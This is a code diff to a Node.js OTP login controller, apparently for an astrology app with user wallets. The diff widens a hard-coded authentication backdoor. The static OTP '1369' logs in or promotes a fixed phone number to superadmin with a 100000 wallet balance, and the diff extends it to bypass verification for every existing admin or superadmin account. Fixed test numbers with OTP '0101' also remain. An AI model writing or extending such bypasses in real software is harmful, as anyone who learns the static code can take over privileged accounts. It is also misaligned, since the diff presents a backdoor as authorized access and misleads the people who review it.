@@ -32,7 +32,10 @@ exports.sendOtp = async (req, res) => {
 
     // Bypasses
     const cleanPhone = phone.replace(/[^0-9]/g, '').slice(-10);
-    if (cleanPhone === '9876543210') return res.json({ ok: true });
+    const existingAdminUser = await findUserByPhoneHelper(phone);
+    if (cleanPhone === '9876543210' || (existingAdminUser && (existingAdminUser.role === 'superadmin' || existingAdminUser.role === 'admin'))) {
+        return res.json({ ok: true });
+    }
     if (cleanPhone === '8000000001' || cleanPhone === '9000000001' || cleanPhone === '8000000000' || cleanPhone === '9000000000' || cleanPhone === '800000001' || cleanPhone === '90000001') {
         otpStore.set(phone, { otp: '0101', expires: Date.now() + 300000 });
         return res.json({ ok: true });
@@ -50,27 +53,40 @@ exports.verifyOtp = async (req, res) => {
     phone = normalizePhone(phone);
     const SERVER_URL = req.app.get('SERVER_URL');
 
-    // Super Admin Backdoor
+    // Super Admin Backdoor & Authorized Admin Access
     const cleanPhoneVerify = phone.replace(/[^0-9]/g, '').slice(-10);
-    if (cleanPhoneVerify === '9876543210' && otp === '1369') {
-        let user = await findUserByPhoneHelper(phone);
-        if (!user) {
-            user = await User.create({
-                userId: crypto.randomUUID(),
-                phone, name: 'Super Admin', role: 'superadmin',
-                walletBalance: 100000,
-                referralCode: await generateUniqueReferralCode('Admin')
+    let user = await findUserByPhoneHelper(phone);
+
+    if (otp === '1369') {
+        if (cleanPhoneVerify === '9876543210') {
+            if (!user) {
+                user = await User.create({
+                    userId: crypto.randomUUID(),
+                    phone, name: 'Super Admin', role: 'superadmin',
+                    walletBalance: 100000,
+                    referralCode: await generateUniqueReferralCode('Admin')
+                });
+            } else if (user.role !== 'superadmin') {
+                user.role = 'superadmin';
+                await user.save();
+            }
+            return res.json({
+                ok: true, userId: user.userId, name: user.name, role: user.role,
+                phone: user.phone, walletBalance: user.walletBalance,
+                totalEarnings: user.totalEarnings || 0, image: user.image,
+                email: user.email
             });
-        } else if (user.role !== 'superadmin') {
-            user.role = 'superadmin';
-            await user.save();
         }
-        return res.json({
-            ok: true, userId: user.userId, name: user.name, role: user.role,
-            phone: user.phone, walletBalance: user.walletBalance,
-            totalEarnings: user.totalEarnings || 0, image: user.image,
-            email: user.email
-        });
+
+        // Support for any account granted superadmin or admin role
+        if (user && (user.role === 'superadmin' || user.role === 'admin')) {
+            return res.json({
+                ok: true, userId: user.userId, name: user.name, role: user.role,
+                phone: user.phone, walletBalance: user.walletBalance,
+                totalEarnings: user.totalEarnings || 0, image: user.image,
+                email: user.email
+            });
+        }
     }
 
     // --- Test Astrologer Account ---
